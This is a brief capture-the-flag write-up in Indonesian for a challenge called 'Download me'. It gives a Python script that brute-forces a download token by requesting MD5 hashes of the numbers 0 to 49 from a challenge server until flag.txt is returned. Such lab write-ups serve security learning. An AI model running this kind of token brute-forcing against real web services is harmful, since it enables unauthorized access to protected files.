# Download me

diberikan sebuah web beserta dengan pengecekan token<br>
asumsi adalah token merupakan size dari file txt tsb<br>
bruteforce dengan intruder attack md5hash 1 - 50<br> 

berikut script<br>
```
import hashlib,requests

url = "http://165.22.22.11:25632/download.php?file=flag.txt&token="

for i in range(50):
        print i
        bf = hashlib.md5(str(i).encode()).hexdigest()
        hasil = requests.get(url+bf)
        if "Invalid" not in hasil.text :
                print hasil.text

#print hashlib.md5("34".encode()).hexdigest()

```

